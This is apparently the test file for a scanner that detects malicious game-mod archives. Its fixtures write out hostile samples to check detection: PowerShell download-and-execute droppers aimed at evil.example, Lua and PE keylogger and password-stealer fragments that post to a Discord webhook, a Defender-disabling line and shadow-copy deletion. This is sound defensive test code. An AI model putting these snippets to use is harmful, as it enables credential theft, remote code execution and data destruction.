# Anti-Logging Bear by Priest

from __future__ import annotations

import zlib

import pytest

from antiloggingbear.engine import ScanOptions, Severity, Verdict, scan_path
from antiloggingbear.engine.yara_rules import shared_engine
from samples import encoded_command, make_lnk, make_pdf, make_pe, make_zip

WEBHOOK = "https://discord.com/api/webhooks/123456789012345678/AbCdEf-GhIjKlMnOpQrStUv"


@pytest.fixture
def scan(tmp_path):
    def _scan(name, data, **opts):
        target = tmp_path / name
        target.write_bytes(data)
        options = ScanOptions(use_antivirus=False, **opts)
        return scan_path(str(target), options)
    return _scan


def checks(report):
    return {f.check for f in report.findings}


def test_plain_text_zip_is_clean(scan):
    data = make_zip([("readme.txt", b"Thanks for downloading!\n"), ("docs/changelog.md", b"# 1.0\n- first\n")])
    report = scan("mod.zip", data)
    assert report.verdict is Verdict.CLEAN
    assert len(report.files) == 3


def test_path_traversal(scan):
    report = scan("evil.zip", make_zip([("../../Startup/run.txt", b"hello")]))
    assert "archive.traversal" in checks(report)
    assert report.verdict is Verdict.SUSPICIOUS


def test_encrypted_member_cannot_be_inspected(scan):
    report = scan("locked.zip", make_zip([("setup.exe", b"MZ" + b"\x00" * 100)], encrypted=("setup.exe",)))
    assert "archive.encrypted" in checks(report)
    assert report.verdict is Verdict.SUSPICIOUS


def test_zip_bomb_is_not_unpacked(scan):
    report = scan("bomb.zip", make_zip([("big.bin", b"\x00" * (24 * 1024 * 1024))]))
    assert "archive.bomb" in checks(report)


def test_double_extension_and_disguised_exe(scan):
    pe = make_pe({"kernel32.dll": ["ExitProcess"]})
    report = scan("invoice.zip", make_zip([("invoice.pdf.exe", pe), ("photo.jpg", pe)]))
    assert {"name.double-ext", "content.disguised-exe"} <= checks(report)
    assert report.verdict is Verdict.SUSPICIOUS


def test_bidi_override_name(scan):
    report = scan("pics.zip", make_zip([("holiday‮gpj.exe", b"MZ")]))
    assert report.verdict is Verdict.DANGEROUS


def test_powershell_dropper(scan):
    script = b"$x = (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1') | iex\n"
    report = scan("tool.zip", make_zip([("install.ps1", script)]))
    assert "script.dropper" in checks(report)
    assert report.verdict is not Verdict.CLEAN


def test_powershell_keylogger_is_dangerous(scan):
    script = (
        "Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern short GetAsyncKeyState(int k);'\n"
        f"Invoke-RestMethod -Uri '{WEBHOOK}' -Method Post -Body $log\n"
    ).encode()
    report = scan("helper.zip", make_zip([("helper.ps1", script)]))
    assert "script.keylogger" in checks(report)
    assert report.verdict is Verdict.DANGEROUS
    assert any("discord.com/api/webhooks" in i for i in report.indicators())


def test_encoded_powershell_is_decoded(scan):
    hidden = encoded_command("iex (iwr 'http://evil.example/stage2.ps1')")
    script = f"powershell.exe -w hidden -enc {hidden}".encode()
    report = scan("launcher.zip", make_zip([("run.bat", script)]))
    found = checks(report)
    assert "script.obfuscation.ps-encoded" in found
    assert any(f.path.endswith("[decoded]") for f in report.findings)


def test_lua_key_stealer_vs_normal_mod(scan):
    stealer = (
        "local ffi = require 'ffi'\nffi.cdef[[ short GetAsyncKeyState(int vKey); ]]\n"
        "local requests = require 'requests'\n"
        f"requests.post('{WEBHOOK}', {{ data = buffer }})\n"
    ).encode()
    normal = (
        b"require 'lib.moonloader'\nlocal sampev = require 'lib.samp.events'\n"
        b"function main()\n while true do wait(0)\n if isKeyDown(VK_F2) then sampAddChatMessage('hi', -1) end\n end\nend\n"
    )
    bad = scan("bad.zip", make_zip([("moonloader/fps boost.lua", stealer)]))
    good = scan("good.zip", make_zip([("moonloader/Spellcheck by Priest v1.0.lua", normal)]))
    assert bad.verdict is Verdict.DANGEROUS
    assert good.verdict is Verdict.CLEAN


def test_pe_keylogger_imports(scan):
    pe = make_pe(
        {"user32.dll": ["SetWindowsHookExW", "GetForegroundWindow"], "wininet.dll": ["InternetOpenUrlA"]},
        extra=b"[BACKSPACE]\x00[ENTER]\x00[SHIFT]\x00" + WEBHOOK.encode() + b"\x00",
    )
    report = scan("gta-fps-boost.zip", make_zip([("fpsboost.asi", pe)]))
    assert "pe.keylogger" in checks(report)
    assert report.verdict is Verdict.DANGEROUS
    assert "pe.asi" in checks(report)


def test_plain_pe_is_clean(scan):
    report = scan("tool.zip", make_zip([("tool.exe", make_pe({"kernel32.dll": ["ExitProcess", "GetStdHandle"]}))]))
    assert report.verdict is Verdict.CLEAN
    assert report.worst <= Severity.LOW


def test_game_mod_hotkeys_are_low(scan):
    pe = make_pe({"user32.dll": ["GetAsyncKeyState"], "kernel32.dll": ["CreateFileA"]})
    report = scan("trainer.zip", make_zip([("hotkeys.asi", pe)]))
    assert report.verdict is Verdict.CLEAN
    assert "pe.keys" in checks(report)


def test_shortcut_running_powershell(scan):
    lnk = make_lnk(r"..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                   "-w hidden -c iwr http://evil.example/p.ps1 | iex")
    report = scan("photos.zip", make_zip([("Photos.lnk", lnk)]))
    assert "lnk.lolbin" in checks(report)
    assert report.verdict is Verdict.DANGEROUS


def test_pdf_autorun_javascript(scan):
    stream = zlib.compress(b"<< /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>")
    pdf = make_pdf(b"<< /Length %d /Filter /FlateDecode >>\nstream\n" % len(stream) + stream + b"\nendstream")
    report = scan("manual.zip", make_zip([("manual.pdf", pdf)]))
    assert "pdf.autorun-js" in checks(report)


def test_remote_template_docx(scan):
    rels = (b'<?xml version="1.0"?><Relationships><Relationship Id="rId1" '
            b'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
            b'Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>')
    docx = make_zip([("[Content_Types].xml", b"<Types/>"), ("word/_rels/settings.xml.rels", rels)])
    report = scan("letter.docx", docx)
    assert "office.remote-template" in checks(report)
    assert report.verdict is Verdict.SUSPICIOUS


def test_nested_zip_is_followed(scan):
    inner = make_zip([("payload.ps1", b"Set-MpPreference -DisableRealtimeMonitoring $true\n")])
    report = scan("outer.zip", make_zip([("inner.zip", inner)]))
    assert any(f.path == "inner.zip/payload.ps1" for f in report.findings)
    assert report.verdict is Verdict.DANGEROUS


def test_single_script_file(scan):
    report = scan("cleanup.bat", b"@echo off\nvssadmin delete shadows /all /quiet\n")
    assert report.verdict is Verdict.DANGEROUS


def test_strict_mode_raises_medium(scan):
    data = make_zip([("run.ps1", b"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File x.ps1\n")])
    assert scan("a.zip", data).verdict is Verdict.CLEAN
    assert scan("b.zip", data, strict=True).verdict is Verdict.SUSPICIOUS


def test_yara_rules_compile():
    engine = shared_engine()
    if "unavailable" in engine.status:
        pytest.skip("yara-python not installed")
    assert engine.status.startswith("ready")
    hits = engine.match("x", b"junk EICAR-STANDARD-ANTIVIRUS-TEST-FILE junk")
    assert any(f.check == "yara.ALB_Test_Signature" for f in hits)


def test_mod_framework_patterns_stay_clean(scan):
    loader = make_pe({"user32.dll": ["GetClipboardData", "GetAsyncKeyState"],
                      "kernel32.dll": ["VirtualAllocEx", "CreateFileA"], "ws2_32.dll": ["connect", "send"]},
                     extra=b"moonloader.log\x00")
    events_lib = b"function onSendDialogResponse(id, button, list, input) end\nreturn sampev\n"
    report = scan("framework.zip", make_zip([("SAMPFUNCS.asi", loader), ("lib/samp/events.lua", events_lib)]))
    assert report.verdict is Verdict.CLEAN


def test_dialog_password_stealer(scan):
    script = (
        "local sampev = require 'lib.samp.events'\nlocal requests = require 'requests'\n"
        "function sampev.onSendDialogResponse(id, b, l, input)\n"
        f"  requests.post('{WEBHOOK}', {{ data = input }})\nend\n"
    ).encode()
    report = scan("autologin.zip", make_zip([("moonloader/autologin.lua", script)]))
    assert "script.dialog-stealer" in checks(report)
    assert report.verdict is Verdict.DANGEROUS
